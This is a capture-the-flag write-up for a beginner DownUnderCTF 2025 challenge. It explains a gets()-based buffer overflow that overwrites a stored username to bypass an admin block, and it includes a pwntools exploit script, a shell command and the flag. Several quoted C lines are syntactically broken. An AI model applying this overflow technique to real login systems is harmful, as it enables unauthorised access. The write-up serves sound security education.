# Corporate cliche — Down under CTF 2025 (Beginner)

[← Back to DUC CTF 2025](../ctf-duc-2025.md)

Category: Beginner

Points:

Author: Blue Alder

## Description

It's time to really push the envelope and go above and beyond! We've got a new challenge for you. Can you find a way to get into our email server?

AU: nc chal.2025.ductf.net 30000
US: nc chal.2025-us.ductf.net 30000

## Summary

This challenge involves exploiting a classic buffer overflow vulnerability in a C-based login system. The goal is to access the disabled admin account, which would normally trigger open_admin_session() and give us access to the flag.

Although the username admin is explicitly blocked in the code, there's a way to bypass this restriction by carefully crafting the password input and overflowing into memory to overwrite the stored username.

## Code Analysis

Here’s the vulnerable code section with key behavior annotated:

```c++
printf("Enter your username: ");
fgets(username, sizeof(username), stdin);
username[strcspn(username, "\n")] = 0;

if (strcmp(username, "admin") == 0) {
    printf("-> Admin login is disabled. Access denied.\n");
    exit(0;
}

printf("Enter your password: ");
gets(password;

```

- The username is securely read using fgets(). 
- If the input is "admin", the program immediately exits. 
- However, the password is read using gets(), which doesn't limit input length, allowing for an overflow. 
- After the password is entered, the program compares the provided username and password to entries in a hardcoded list (logins).

Inside this loop:

```c++
if (strcmp(username, logins[i][0]) == 0) {
    if (strcmp(password, logins[i][1]) == 0) {
        printf("-> Password correct. Access granted.\n");
        if (strcmp(username, "admin") == 0) {
            open_admin_session;     // This will print flag
        } else {
            print_email();
        }
```

This means, if we can overflow password and change username to "admin", we’ll bypass the initial check and pass into open_admin_session().

## Exploit Strategy

We use a safe dummy username like "guest" initially. Then:

- Start the password with a known valid password (the emoji sequence "🇦🇩🇲🇮🇳" which is "admin" in emoji). 
- Pad the buffer with filler bytes to reach the location of the username variable in memory. 
- Overwrite the username with "admin" — tricking the program into thinking we logged in as admin. 
- Since "admin" isn't blocked after the initial check, and we now match the logins table for "admin", it calls open_admin_session().

## Exploit script

```
from pwn import *

p = remote("chal.2025-us.ductf.net", 30000)

p.sendlineafter("Enter your username: ", "guest")

emoji_pw = "🇦🇩🇲🇮🇳".encode("utf-8") + b"\x00"   
padding = b"A" * (32 - len(emoji_pw))
overwrite = b"admin"

payload = emoji_pw + padding + overwrite
p.sendlineafter("Enter your password: ", payload)

p.sendline("cat flag.txt")
flag = p.recvline_contains(b'DUCTF{')

print(flag.decode().strip())
```

## ✅ Final Flag

    DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}
